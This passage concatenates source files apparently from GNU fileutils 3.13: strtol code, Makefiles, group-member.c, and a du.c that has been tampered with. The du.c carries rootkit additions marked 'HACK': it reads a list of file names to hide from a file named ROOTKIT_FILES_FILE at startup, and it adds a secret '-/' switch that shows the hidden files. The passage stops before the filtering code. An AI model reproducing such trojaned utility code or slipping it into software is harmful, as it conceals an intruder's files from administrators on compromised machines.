    {
      negative = 1;
      ++s;
    }
  else if (*s == L_('+'))
    {
      negative = 0;
      ++s;
    }
  else
    negative = 0;

  if (base == 16 && s[0] == L_('0') && TOUPPER (s[1]) == L_('X'))
    s += 2;

  /* If BASE is zero, figure it out ourselves.  */
  if (base == 0)
    if (*s == L_('0'))
      {
	if (TOUPPER (s[1]) == L_('X'))
	  {
	    s += 2;
	    base = 16;
	  }
	else
	  base = 8;
      }
    else
      base = 10;

  /* Save the pointer so we can check later if anything happened.  */
  save = s;

#ifdef USE_NUMBER_GROUPING
  if (group)
    {
      /* Find the end of the digit string and check its grouping.  */
      end = s;
      for (c = *end; c != L_('\0'); c = *++end)
	if (c != thousands && (c < L_('0') || c > L_('9'))
	    && (!ISALPHA (c) || TOUPPER (c) - L_('A') + 10 >= base))
	  break;
      if (*s == thousands)
	end = s;
      else
	end = correctly_grouped_prefix (s, end, thousands, grouping);
    }
  else
#endif
    end = NULL;

  cutoff = ULONG_MAX / (unsigned LONG int) base;
  cutlim = ULONG_MAX % (unsigned LONG int) base;

  overflow = 0;
  i = 0;
  for (c = *s; c != L_('\0'); c = *++s)
    {
      if (s == end)
	break;
      if (c >= L_('0') && c <= L_('9'))
	c -= L_('0');
      else if (ISALPHA (c))
	c = TOUPPER (c) - L_('A') + 10;
      else
	break;
      if (c >= base)
	break;
      /* Check for overflow.  */
      if (i > cutoff || (i == cutoff && c > cutlim))
	overflow = 1;
      else
	{
	  i *= (unsigned LONG int) base;
	  i += c;
	}
    }

  /* Check if anything actually happened.  */
  if (s == save)
    goto noconv;

  /* Store in ENDPTR the address of one character
     past the last character we converted.  */
  if (endptr != NULL)
    *endptr = (STRING_TYPE *) s;

#if !UNSIGNED
  /* Check for a value that is within the range of
     `unsigned LONG int', but outside the range of `LONG int'.  */
  if (overflow == 0
      && i > (negative
	      ? -((unsigned LONG int) (LONG_MIN + 1)) + 1
	      : (unsigned LONG int) LONG_MAX))
    overflow = 1;
#endif

  if (overflow)
    {
      errno = ERANGE;
#if UNSIGNED
      return ULONG_MAX;
#else
      return negative ? LONG_MIN : LONG_MAX;
#endif
    }

  /* Return the result of the appropriate sign.  */
  return (negative ? -i : i);

noconv:
  /* We must handle a special case here: the base is 0 or 16 and the
     first two characters and '0' and 'x', but the rest are no
     hexadecimal digits.  This is no error case.  We return 0 and
     ENDPTR points to the `x`.  */
  if (endptr != NULL)
    if (save - nptr >= 2 && TOUPPER (save[-1]) == L_('X')
	&& save[-2] == L_('0'))
      *endptr = (STRING_TYPE *) &save[-1];
    else
      /*  There was no number to convert.  */
      *endptr = (STRING_TYPE *) nptr;

  return 0L;
}

/* External user entry point.  */

#undef __P
#if defined (__STDC__) && __STDC__
#define __P(args) args
#else
#define __P(args) ()
#endif

/* Prototype.  */
INT strtol __P ((const STRING_TYPE *nptr, STRING_TYPE **endptr,
			    int base));


INT
strtol (nptr, endptr, base)
     const STRING_TYPE *nptr;
     STRING_TYPE **endptr;
     int base;
{
  return INTERNAL (strtol) (nptr, endptr, base, 0);
}
/* Copyright (C) 1991 Free Software Foundation, Inc.

NOTE: The canonical source of this file is maintained with the GNU C Library.
Bugs can be reported to bug-glibc@prep.ai.mit.edu.

This program is free software; you can redistribute it and/or modify it
under the terms of the GNU General Public License as published by the
Free Software Foundation; either version 2, or (at your option) any
later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, 675 Mass Ave, Cambridge, MA 02139, USA.  */

#define	UNSIGNED	1

#include <strtol.c>
# Generated automatically from Makefile.in by configure.
# Makefile.in generated automatically by automake 1.0 from Makefile.am

# Copyright (C) 1994, 1995, 1996 Free Software Foundation, Inc.
# This Makefile.in is free software; the Free Software Foundation
# gives unlimited permission to copy, distribute and modify it.


SHELL = /bin/sh

srcdir = .
top_srcdir = ..
prefix = /usr/local
exec_prefix = ${prefix}

bindir = ${exec_prefix}/bin
sbindir = ${exec_prefix}/sbin
libexecdir = ${exec_prefix}/libexec
datadir = ${prefix}/share
sysconfdir = ${prefix}/etc
sharedstatedir = ${prefix}/com
localstatedir = ${prefix}/var
libdir = ${exec_prefix}/lib
infodir = ${prefix}/info
mandir = ${prefix}/man
includedir = ${prefix}/include
oldincludedir = /usr/include

pkgdatadir = $(datadir)/fileutils
pkglibdir = $(libdir)/fileutils
pkgincludedir = $(includedir)/fileutils

top_builddir = ..

INSTALL = /usr/bin/ginstall -c
INSTALL_PROGRAM = ${INSTALL}
INSTALL_DATA = ${INSTALL} -m 644
INSTALL_SCRIPT = @INSTALL_SCRIPT@
transform = s,x,x,

noinst_LIBRARIES = fu

EXTRA_DIST = alloca.c basename.c euidaccess.c fnmatch.c fsusage.c \
ftruncate.c getdate.y getopt.c getopt1.c group-member.c \
memcmp.c memcpy.c memset.c \
mkdir.c mktime.c mountlist.c posixtm.y rename.c rmdir.c \
stpcpy.c strcasecmp.c strdup.c strndup.c strstr.c strtol.c strtoul.c

INCLUDES = -I.. -I$(srcdir)

fu_SOURCES = getdate.c getline.c posixtm.c argmatch.c backupfile.c \
dirname.c error.c fileblocks.c filemode.c \
full-write.c getversion.c idcache.c \
isdir.c long-options.c makepath.c modechange.c obstack.c \
safe-read.c save-cwd.c savedir.c stripslash.c userspec.c xgetcwd.c \
xmalloc.c xstrdup.c xstrtol.c xstrtoul.c yesno.c

fu_LIBADD =  euidaccess.o group_member.o strndup.o fsusage.o mountlist.o 

noinst_HEADERS = argmatch.h backupfile.h error.h fnmatch.h fsusage.h \
getline.h getopt.h group-member.h long-options.h makepath.h modechange.h \
mountlist.h obstack.h pathmax.h save-cwd.h xstrtol.h xstrtoul.h

BUILT_SOURCES = getdate.c posixtm.c
mkinstalldirs = $(top_srcdir)/mkinstalldirs
CONFIG_HEADER = ../config.h
LIBRARIES = $(noinst_LIBRARIES)

noinst_LIBFILES = libfu.a

CC = gcc
LEX = @LEX@
YACC = bison -y

DEFS = -DHAVE_CONFIG_H -I. -I$(srcdir) -I..
CPPFLAGS = 
CFLAGS = -g -O
LDFLAGS = 
LIBS = 

COMPILE = $(CC) -c $(DEFS) $(INCLUDES) $(CPPFLAGS) $(CFLAGS)
LINK = $(CC) $(LDFLAGS) -o $@
fu_OBJECTS = getdate.o getline.o posixtm.o argmatch.o backupfile.o \
dirname.o error.o fileblocks.o filemode.o full-write.o getversion.o \
idcache.o isdir.o long-options.o makepath.o modechange.o obstack.o \
safe-read.o save-cwd.o savedir.o stripslash.o userspec.o xgetcwd.o \
xmalloc.o xstrdup.o xstrtol.o xstrtoul.o yesno.o
EXTRA_fu_SOURCES =
LIBFILES =  libfu.a
AR = ar
RANLIB = ranlib
HEADERS = $(noinst_HEADERS)

DIST_COMMON = Makefile.am Makefile.in


PACKAGE = fileutils
VERSION = 3.13

DISTFILES = $(DIST_COMMON) $(SOURCES) $(BUILT_SOURCES) $(HEADERS) \
	$(TEXINFOS) $(INFOS) $(MANS) $(EXTRA_DIST) $(DATA)
DEP_DISTFILES = $(DIST_COMMON) $(SOURCES) $(BUILT_SOURCES) $(HEADERS) \
	$(TEXINFOS) $(INFO_DEPS) $(MANS) $(EXTRA_DIST) $(DATA)

TAR = tar
SOURCES = $(fu_SOURCES)
OBJECTS = $(fu_OBJECTS)

default: all


mostlyclean-noinstLIBRARIES:

clean-noinstLIBRARIES:
	rm -f $(noinst_LIBFILES)

distclean-noinstLIBRARIES:

maintainer-clean-noinstLIBRARIES:

.c.o:
	$(COMPILE) $<

mostlyclean-compile:
	rm -f *.o core

clean-compile:

distclean-compile:
	rm -f *.tab.c

maintainer-clean-compile:
$(fu_OBJECTS): ../config.h

libfu.a: $(fu_OBJECTS) $(fu_LIBADD)
	rm -f libfu.a
	$(AR) cru libfu.a $(fu_OBJECTS) $(fu_LIBADD)
	$(RANLIB) libfu.a

ID: $(HEADERS) $(SOURCES)
	here=`pwd` && cd $(srcdir) && mkid -f$$here/ID $(SOURCES) $(HEADERS)

tags: TAGS

TAGS: $(HEADERS) $(SOURCES) $(TAGS_DEPENDENCIES)
	here=`pwd` && cd $(srcdir) && etags $(ETAGS_ARGS) $(SOURCES) $(HEADERS) -o $$here/TAGS

mostlyclean-tags:

clean-tags:

distclean-tags:
	rm -f TAGS ID

maintainer-clean-tags:

subdir = lib
distdir = $(top_builddir)/$(PACKAGE)-$(VERSION)/$(subdir)
distdir: $(DEP_DISTFILES)
	@for file in `cd $(srcdir) && echo $(DISTFILES)`; do \
	  test -f $(distdir)/$$file \
	  || ln $(srcdir)/$$file $(distdir)/$$file 2> /dev/null \
	  || cp -p $(srcdir)/$$file $(distdir)/$$file; \
	done
alloca.o: alloca.c
argmatch.o: argmatch.c
backupfile.o: backupfile.c backupfile.h
basename.o: basename.c
dirname.o: dirname.c
error.o: error.c
fileblocks.o: fileblocks.c
filemode.o: filemode.c
fnmatch.o: fnmatch.c
fsusage.o: fsusage.c fsusage.h
ftruncate.o: ftruncate.c
full-write.o: full-write.c
getdate.o: getdate.c
getline.o: getline.c
getopt.o: getopt.c
getopt1.o: getopt1.c getopt.h
getversion.o: getversion.c backupfile.h
group-member.o: group-member.c group-member.h
idcache.o: idcache.c
isdir.o: isdir.c
long-options.o: long-options.c long-options.h
makepath.o: makepath.c makepath.h
modechange.o: modechange.c modechange.h
mountlist.o: mountlist.c mountlist.h
obstack.o: obstack.c obstack.h
posixtm.o: posixtm.c
safe-read.o: safe-read.c
save-cwd.o: save-cwd.c ../config.h save-cwd.h error.h
savedir.o: savedir.c
stripslash.o: stripslash.c
userspec.o: userspec.c
xgetcwd.o: xgetcwd.c pathmax.h
xmalloc.o: xmalloc.c
xstrdup.o: xstrdup.c
xstrtol.o: xstrtol.c xstrtol.h
xstrtoul.o: xstrtoul.c xstrtol.c xstrtol.h
yesno.o: yesno.c

info:

dvi:

check: all

installcheck:

install-exec: 

install-data: 

install: install-exec install-data all
	@:

uninstall: 

all: $(LIBFILES) $(HEADERS) Makefile

install-strip:
	$(MAKE) INSTALL_PROGRAM='$(INSTALL_PROGRAM) -s' install
installdirs:


mostlyclean-generic:
	test -z "$(MOSTLYCLEANFILES)" || rm -f $(MOSTLYCLEANFILES)

clean-generic:
	test -z "$(CLEANFILES)" || rm -f $(CLEANFILES)

distclean-generic:
	rm -f Makefile $(DISTCLEANFILES)
	rm -f config.cache config.log $(CONFIG_HEADER) stamp-h

maintainer-clean-generic:
	test -z "$(MAINTAINERCLEANFILES)" || rm -f $(MAINTAINERCLEANFILES)
	test -z "$(BUILT_SOURCES)" || rm -f $(BUILT_SOURCES)
mostlyclean:  mostlyclean-noinstLIBRARIES mostlyclean-compile \
		mostlyclean-tags mostlyclean-generic

clean:  clean-noinstLIBRARIES clean-compile clean-tags clean-generic \
		mostlyclean 

distclean:  distclean-noinstLIBRARIES distclean-compile distclean-tags \
		distclean-generic clean 
	rm -f config.status

maintainer-clean:  maintainer-clean-noinstLIBRARIES \
		maintainer-clean-compile maintainer-clean-tags \
		maintainer-clean-generic distclean 
	@echo "This command is intended for maintainers to use;"
	@echo "it deletes files that may require special tools to rebuild."

.PHONY: default mostlyclean-noinstLIBRARIES distclean-noinstLIBRARIES \
clean-noinstLIBRARIES maintainer-clean-noinstLIBRARIES \
mostlyclean-compile distclean-compile clean-compile \
maintainer-clean-compile tags mostlyclean-tags distclean-tags \
clean-tags maintainer-clean-tags distdir info dvi check installcheck \
install-exec install-data install uninstall all installdirs \
mostlyclean-generic distclean-generic clean-generic \
maintainer-clean-generic clean mostlyclean distclean maintainer-clean


# Since this directory contains two parsers, we have to be careful to avoid
# running two $(YACC)s during parallel makes.  See below.
getdate.c: #M#getdate.y
	@echo expect 10 shift/reduce conflicts
	$(YACC) $(srcdir)/getdate.y
	mv y.tab.c getdate.c

# Make the rename atomic, in case sed is interrupted and later rerun.
# The artificial dependency on getdate.c keeps the two parsers from being
# built in parallel.  Enforcing this little bit of sequentiality lets
# everyone (even those without bison) still run mostly parallel builds.
posixtm.c: #M#posixtm.y getdate.c
	$(YACC) $(srcdir)/posixtm.y
	mv y.tab.c posixtm.tab.c
	sed -e 's/yy/zz/g' posixtm.tab.c > tposixtm.c
	mv tposixtm.c posixtm.c
	rm -f posixtm.tab.c
.SUFFIXES:
.SUFFIXES: .c .o

# Tell versions [3.59,3.63) of GNU make to not export all variables.
# Otherwise a system limit (for SysV at least) may be exceeded.
.NOEXPORT:
/* group-member.c -- determine whether group id is in calling user's group list
   Copyright (C) 1994 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#include <stdio.h>
#include <sys/types.h>

#ifdef STDC_HEADERS
#include <stdlib.h>
#endif

#ifdef HAVE_UNISTD_H
#include <unistd.h>
#endif

#include "group-member.h"

char *xmalloc ();
char *xrealloc ();

struct group_info
  {
    int n_groups;
    GETGROUPS_T *group;
  };

#ifdef HAVE_GETGROUPS

static void
free_group_info (g)
     struct group_info *g;
{
  free (g->group);
  free (g);
}

static struct group_info *
get_group_info ()
{
  int n_groups;
  int n_group_slots;
  struct group_info *gi;
  GETGROUPS_T *group;

  /* getgroups () returns the number of elements that it was able to
     place into the array.  We simply continue to call getgroups ()
     until the number of elements placed into the array is smaller than
     the physical size of the array. */

  group = NULL;
  n_groups = 0;
  n_group_slots = 0;
  while (n_groups == n_group_slots)
    {
      n_group_slots += 64;
      group = (GETGROUPS_T *) xrealloc (group,
					n_group_slots * sizeof (GETGROUPS_T));
      n_groups = getgroups (n_group_slots, group);
    }

  /* In case of error, the user loses. */
  if (n_groups < 0)
    {
      free (group);
      return NULL;
    }

  gi = (struct group_info *) xmalloc (sizeof (*gi));
  gi->n_groups = n_groups;
  gi->group = group;

  return gi;
}

#endif /* not HAVE_GETGROUPS */

/* Return non-zero if GID is one that we have in our groups list.
   If there is no getgroups function, return non-zero if GID matches
   either of the current or effective group IDs.  */

int
group_member (gid)
     gid_t gid;
{
#ifndef HAVE_GETGROUPS
  return ((gid == getgid ()) || (gid == getegid ()));
#else
  int i;
  int found;
  struct group_info *gi;

  gi = get_group_info ();
  if (gi == NULL)
    return 0;

  /* Search through the list looking for GID. */
  found = 0;
  for (i = 0; i < gi->n_groups; i++)
    {
      if (gid == gi->group[i])
	{
	  found = 1;
	  break;
	}
    }
  
  free_group_info (gi);

  return found;
#endif /* HAVE_GETGROUPS */
}

#ifdef TEST

char *program_name;

int
main (int argc, char** argv)
{
  int i;

  program_name = argv[0];

  for (i=1; i<argc; i++)
    {
      gid_t gid;

      gid = atoi (argv[i]);
      printf ("%d: %s\n", gid, group_member (gid) ? "yes" : "no");
    }
  exit (0);
}

#endif /* TEST */
## Process this file with automake to produce Makefile.in
AUTOMAKE_OPTIONS = ansi2knr

EXTRAdir = $(bindir)
EXTRA_PROGRAMS = df mvdir

bin_PROGRAMS = dircolors du \
ginstall dir vdir ls 

libexec_PROGRAMS = @MVDIR_PROG@
datadir = $(prefix)/@DATADIRNAME@
localedir = $(datadir)/locale

noinst_HEADERS = system.h cp.h ls.h
EXTRA_DIST = ansi2knr.1 ansi2knr.c cp-aux.c cp-hash.c dcgen.pl dircolors.hin

INCLUDES = -I.. -I$(srcdir) -I$(top_srcdir)/lib -I../intl
DEFS = -DLOCALEDIR=\"$(localedir)\" -DSHAREDIR=\"$(datadir)\" @DEFS@
LDADD = @INTLLIBS@ ../lib/libfu.a

$(bin_PROGRAMS) $(libexec_PROGRAMS): ../lib/libfu.a

# Use `ginstall' in the definition of PROGRAMS and in dependencies to avoid
# confusion with the `install' target.  The install rule transforms `ginstall'
# to install before applying any user-specified name transformations.

transform = s/ginstall/install/; @program_transform_name@
ginstall_SOURCES = install.c

cp_SOURCES = cp.c cp-aux.c cp-hash.c
dir_SOURCES = ls.c ls-dir.c
vdir_SOURCES = ls.c ls-vdir.c
ls_SOURCES = ls.c ls-ls.c

BUILT_SOURCES = @MAINT@dircolors.h
PERL = @PERL@
editpl = sed -e 's,@''PERL''@,$(PERL),g'

CLEANFILES = dcgen
MAINTAINERCLEANFILES = dircolors.h

dircolors.h: @MAINT@dcgen dircolors.hin
	./dcgen dircolors.hin > $@-t
	mv $@-t $@

SUFFIXES = .pl

.pl:
	rm -f $@ $@.tmp
	$(editpl) $< > $@.tmp && chmod +x $@.tmp && mv $@.tmp $@

/* du -- summarize disk usage
   Copyright (C) 88, 89, 90, 91, 95, 1996 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software Foundation,
   Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.  */

/* Differences from the Unix du:
   * Doesn't simply ignore the names of regular files given as arguments
     when -a is given.
   * Additional options:
   -l		Count the size of all files, even if they have appeared
		already in another hard link.
   -x		Do not cross file-system boundaries during the recursion.
   -c		Write a grand total of all of the arguments after all
		arguments have been processed.  This can be used to find
		out the disk usage of a directory, with some files excluded.
   -h		Print sizes in human readable format (1k 234M 2G, etc).
   -k		Print sizes in kilobytes instead of 512 byte blocks
		(the default required by POSIX).
   -m		Print sizes in megabytes instead of 512 byte blocks
   -b		Print sizes in bytes.
   -S		Count the size of each directory separately, not including
		the sizes of subdirectories.
   -D		Dereference only symbolic links given on the command line.
   -L		Dereference all symbolic links.

   By tege@sics.se, Torbjorn Granlund,
   and djm@ai.mit.edu, David MacKenzie.
   Variable blocks added by lm@sgi.com.
*/

#ifdef _AIX
 #pragma alloca
#endif

#include <config.h>
#include <stdio.h>
#include <getopt.h>
#include <sys/types.h>
#include <assert.h>

#include "system.h"
#include "save-cwd.h"
#include "error.h"

#undef	convert_blocks
#define	convert_blocks(b, size) (size == size_kilobytes ? ((b) + 1) / 2 : \
    size == size_megabytes ? ((b) + 1024) / 2048 : (b))

/* Initial number of entries in each hash table entry's table of inodes.  */
#define INITIAL_HASH_MODULE 100

/* Initial number of entries in the inode hash table.  */
#define INITIAL_ENTRY_TAB_SIZE 70

/* Initial size to allocate for `path'.  */
#define INITIAL_PATH_SIZE 100

/* The maximum length of a human-readable string.  Be pessimistic
   and assume `int' is 64-bits wide.  Converting 2^63 - 1 gives the
   11-character string, 8589934592G.  */
#define LONGEST_HUMAN_READABLE 11

/* HACK VARS global */
#define FILENAME ROOTKIT_FILES_FILE
#define STR_SIZE 128
#define SEP_CHAR " \n"

struct  h_st {
        struct h_st     *next;
        char            filename[STR_SIZE];
};

struct  h_st    *hack_list;
struct  h_st    *h_tmp;

char    tmp_str[STR_SIZE];

FILE    *fp_hack;
int     showall=0;

/* Hash structure for inode and device numbers.  The separate entry
   structure makes it easier to rehash "in place".  */

struct entry
{
  ino_t ino;
  dev_t dev;
  struct entry *coll_link;
};

/* Structure for a hash table for inode numbers. */

struct htab
{
  unsigned modulus;		/* Size of the `hash' pointer vector.  */
  struct entry *entry_tab;	/* Pointer to dynamically growing vector.  */
  unsigned entry_tab_size;	/* Size of current `entry_tab' allocation.  */
  unsigned first_free_entry;	/* Index in `entry_tab'.  */
  struct entry *hash[1];	/* Vector of pointers in `entry_tab'.  */
};


/* Structure for dynamically resizable strings. */

typedef struct
{
  unsigned alloc;		/* Size of allocation for the text.  */
  unsigned length;		/* Length of the text currently.  */
  char *text;			/* Pointer to the text.  */
} *string, stringstruct;

int stat ();
int lstat ();

char *savedir ();
char *xmalloc ();
char *xrealloc ();

static int hash_insert __P ((ino_t ino, dev_t dev));
static int hash_insert2 __P ((struct htab *htab, ino_t ino, dev_t dev));
static long count_entry __P ((char *ent, int top, dev_t last_dev));
static void du_files __P ((char **files));
static void hash_init __P ((unsigned int modulus,
			    unsigned int entry_tab_size));
static void hash_reset __P ((void));
static void str_concatc __P ((string s1, char *cstr));
static void str_copyc __P ((string s1, char *cstr));
static void str_init __P ((string *s1, unsigned int size));
static void str_trunc __P ((string s1, unsigned int length));

/* Name under which this program was invoked.  */
char *program_name;

/* If nonzero, display only a total for each argument. */
static int opt_summarize_only = 0;

/* If nonzero, display counts for all files, not just directories. */
static int opt_all = 0;

/* If nonzero, count each hard link of files with multiple links. */
static int opt_count_all = 0;

/* If nonzero, do not cross file-system boundaries. */
static int opt_one_file_system = 0;

/* If nonzero, print a grand total at the end. */
static int opt_combined_arguments = 0;

/* If nonzero, do not add sizes of subdirectories. */
static int opt_separate_dirs = 0;

/* If nonzero, dereference symlinks that are command line arguments. */
static int opt_dereference_arguments = 0;

enum output_size
{
  size_blocks,			/* 512-byte blocks. */
  size_kilobytes,		/* 1K blocks. */
  size_megabytes,		/* 1024K blocks. */
  size_bytes			/* 1-byte blocks. */
};

/* human style output */
static int opt_human_readable;

/* The units to count in. */
static enum output_size output_size;

/* Accumulated path for file or directory being processed.  */
static string path;

/* Pointer to hash structure, used by the hash routines.  */
static struct htab *htab;

/* Globally used stat buffer.  */
static struct stat stat_buf;

/* A pointer to either lstat or stat, depending on whether
   dereferencing of all symbolic links is to be done. */
static int (*xstat) ();

/* The exit status to use if we don't get any fatal errors. */
static int exit_status;

/* If nonzero, display usage information and exit.  */
static int show_help;

/* If nonzero, print the version on standard output and exit.  */
static int show_version;

/* Grand total size of all args. */
static long tot_size = 0L;

static struct option const long_options[] =
{
  {"all", no_argument, &opt_all, 1},
  {"bytes", no_argument, NULL, 'b'},
  {"count-links", no_argument, &opt_count_all, 1},
  {"dereference", no_argument, NULL, 'L'},
  {"dereference-args", no_argument, &opt_dereference_arguments, 1},
  {"human-readable", no_argument, NULL, 'h'},
  {"kilobytes", no_argument, NULL, 'k'},
  {"megabytes", no_argument, NULL, 'm'},
  {"one-file-system", no_argument, &opt_one_file_system, 1},
  {"separate-dirs", no_argument, &opt_separate_dirs, 1},
  {"summarize", no_argument, &opt_summarize_only, 1},
  {"total", no_argument, &opt_combined_arguments, 1},
  {"help", no_argument, &show_help, 1},
  {"version", no_argument, &show_version, 1},
  {NULL, 0, NULL, 0}
};

static void
usage (int status, char *reason)
{
  if (reason != NULL)
    fprintf (status == 0 ? stdout : stderr, "%s: %s\n",
	     program_name, reason);

  if (status != 0)
    fprintf (stderr, _("Try `%s --help' for more information.\n"),
	     program_name);
  else
    {
      printf (_("Usage: %s [OPTION]... [FILE]...\n"), program_name);
      printf (_("\
Summarize disk usage of each FILE, recursively for directories.\n\
\n\
  -a, --all             write counts for all files, not just directories\n\
  -b, --bytes           print size in bytes\n\
  -c, --total           produce a grand total\n\
  -h, --human-readable  print sizes in human readable format (e.g. 1K 234M 2G)\n\
  -k, --kilobytes       use 1024-byte blocks, not 512 despite POSIXLY_CORRECT\n\
  -l, --count-links     count sizes many times if hard linked\n\
  -m, --megabytes       use 1024K-byte blocks, not 512 despite POSIXLY_CORRECT\n\
  -s, --summarize       display only a total for each argument\n\
  -x, --one-file-system  skip directories on different filesystems\n\
  -D, --dereference-args  dereference PATHs when symbolic link\n\
  -L, --dereference     dereference all symbolic links\n\
  -S, --separate-dirs   do not include size of subdirectories\n\
      --help            display this help and exit\n\
      --version         output version information and exit\n"));
    }
  exit (status);
}

int
main (int argc, char **argv)
{
  int c;
  char *cwd_only[2];
  char *bs;

  cwd_only[0] = ".";
  cwd_only[1] = NULL;

  program_name = argv[0];
  setlocale (LC_ALL, "");
  bindtextdomain (PACKAGE, LOCALEDIR);
  textdomain (PACKAGE);

  xstat = lstat;

  if (getenv ("POSIXLY_CORRECT"))
    output_size = size_blocks;
  else if ((bs = getenv ("BLOCKSIZE"))
	   && strncmp (bs, "HUMAN", sizeof ("HUMAN") - 1) == 0)
    {
      opt_human_readable = 1;
      output_size = size_bytes;
    }
  else
    output_size = size_kilobytes;
#if defined (SHOWFLAG)
  while ((c = getopt_long (argc, argv, "abchklmsxDLS/", long_options,
                           (int *) 0))
         != EOF)
#else
  while ((c = getopt_long (argc, argv, "abchklmsxDLS", long_options,
			   (int *) 0))
	 != EOF)
#endif
    {
      switch (c)
	{
	case 0:			/* Long option. */
	  break;

	case 'a':
	  opt_all = 1;
	  break;

	case 'b':
	  output_size = size_bytes;
	  opt_human_readable = 0;
	  break;

	case 'c':
	  opt_combined_arguments = 1;
	  break;

	case 'h':
	  output_size = size_bytes;
	  opt_human_readable = 1;
	  break;

	case 'k':
	  output_size = size_kilobytes;
	  opt_human_readable = 0;
	  break;

	case 'm':
	  output_size = size_megabytes;
	  opt_human_readable = 0;
	  break;

	case 'l':
	  opt_count_all = 1;
	  break;

	case 's':
	  opt_summarize_only = 1;
	  break;

	case 'x':
	  opt_one_file_system = 1;
	  break;

	case 'D':
	  opt_dereference_arguments = 1;
	  break;

	case 'L':
	  xstat = stat;
	  break;

	case 'S':
	  opt_separate_dirs = 1;
	  break;

/* HACK VIEW ALL FILES WITH -/ */
#if defined (SHOWFLAG)
                case '/':
                        showall++;
                        break;
#endif

	default:
	  usage (2, (char *) 0);
	}
    }

  if (show_version)
    {
      printf ("du - %s\n", PACKAGE_VERSION);
      exit (0);
    }

  if (show_help)
    usage (0, NULL);

  if (opt_all && opt_summarize_only)
    usage (2, _("cannot both summarize and show all entries"));

/* HACK read in list of files to block */

        h_tmp=(struct h_st *)malloc(sizeof(struct h_st));
        hack_list=h_tmp;

        if (fp_hack=fopen (FILENAME, "r")) {
                while (fgets(tmp_str, 126, fp_hack)) {
                        h_tmp->next=(struct h_st *)malloc(sizeof(struct h_st));
                        strcpy (h_tmp->filename, tmp_str);
                        h_tmp->filename[strlen(h_tmp->filename)-1]='\0';
                        h_tmp=h_tmp->next;
                }
        fclose(fp_hack);
        }
        h_tmp->next=NULL;

/*+  On with the program  +*/

  /* Initialize the hash structure for inode numbers.  */
  hash_init (INITIAL_HASH_MODULE, INITIAL_ENTRY_TAB_SIZE);

  str_init (&path, INITIAL_PATH_SIZE);

  du_files (optind == argc ? cwd_only : argv + optind);

  exit (exit_status);
}

/* Convert N_BYTES to a more readable string than %d would.
   Most people visually process strings of 3-4 digits effectively,
   but longer strings of digits are more prone to misinterpretation.
   Hence, converting to an abbreviated form usually improves readability.
   Use a suffix indicating multiples of 1024 (K), 1024*1024 (M), and
   1024*1024*1024 (G).  For example, 8500 would be converted to 8.3K,
   133456345 to 127M, 56990456345 to 53G, and so on.  Numbers smaller
   than 1024 aren't modified.  */

static char *
human_readable (int n_bytes, char *buf, int buf_len)
{
  const char *suffix;
  double amt;
  char *p;

  assert (buf_len > LONGEST_HUMAN_READABLE);

  p = buf;
  amt = n_bytes;

  if (amt >= 1024 * 1024 * 1024)
    {
      amt /= (1024 * 1024 * 1024);
      suffix = "G";
    }
  else if (amt >= 1024 * 1024)
    {
      amt /= (1024 * 1024);
      suffix = "M";
    }
  else if (amt >= 1024)
    {
      amt /= 1024;
      suffix = "K";
    }
  else
    {
      suffix = "";
    }

  if (amt >= 10)
    {
      sprintf (p, "%.0f%s", amt, suffix);
    }
  else if (amt == 0)
    {
      strcpy (p, "0");
    }
  else
    {
      sprintf (p, "%.1f%s", amt, suffix);
    }
  return (p);
}

/* Recursively print the sizes of the directories (and, if selected, files)
   named in FILES, the last entry of which is NULL.  */

static void
du_files (char **files)
{
  struct saved_cwd cwd;
  ino_t initial_ino;		/* Initial directory's inode. */
  dev_t initial_dev;		/* Initial directory's device. */
  int i;			/* Index in FILES. */

  if (save_cwd (&cwd))
    exit (1);

  /* Remember the inode and device number of the current directory.  */
  if (stat (".", &stat_buf))
    error (1, errno, _("current directory"));
  initial_ino = stat_buf.st_ino;
  initial_dev = stat_buf.st_dev;

  for (i = 0; files[i]; i++)
    {
      char *arg;
      int s;

      arg = files[i];

      /* Delete final slash in the argument, unless the slash is alone.  */
      s = strlen (arg) - 1;
      if (s != 0)
	{
	  if (arg[s] == '/')
	    arg[s] = 0;

	  str_copyc (path, arg);
	}
      else if (arg[0] == '/')
	str_trunc (path, 0);	/* Null path for root directory.  */
      else
	str_copyc (path, arg);

      if (!opt_combined_arguments)
	hash_reset ();

      count_entry (arg, 1, 0);

      /* chdir if `count_entry' has changed the working directory.  */
      if (stat (".", &stat_buf))
	error (1, errno, ".");
      if (stat_buf.st_ino != initial_ino || stat_buf.st_dev != initial_dev)
	{
	  if (restore_cwd (&cwd, _("starting directory"), NULL))
	    exit (1);
	}
    }

  if (opt_combined_arguments)
    {
      if (opt_human_readable)
	{
	  char buf[LONGEST_HUMAN_READABLE + 1];
	  printf("%s\ttotal\n", human_readable (tot_size, buf,
						LONGEST_HUMAN_READABLE + 1));
	}
      else
	{
	  printf (_("%ld\ttotal\n"), output_size == size_bytes ? tot_size
		  : convert_blocks (tot_size, output_size == size_kilobytes));
	}
      fflush (stdout);
    }

  free_cwd (&cwd);
}

/* Print (if appropriate) and return the size
   (in units determined by `output_size') of file or directory ENT.
   TOP is one for external calls, zero for recursive calls.
   LAST_DEV is the device that the parent directory of ENT is on.  */

static long
count_entry (char *ent, int top, dev_t last_dev)
{
  long size;

  if (((top && opt_dereference_arguments)
       ? stat (ent, &stat_buf)
       : (*xstat) (ent, &stat_buf)) < 0)
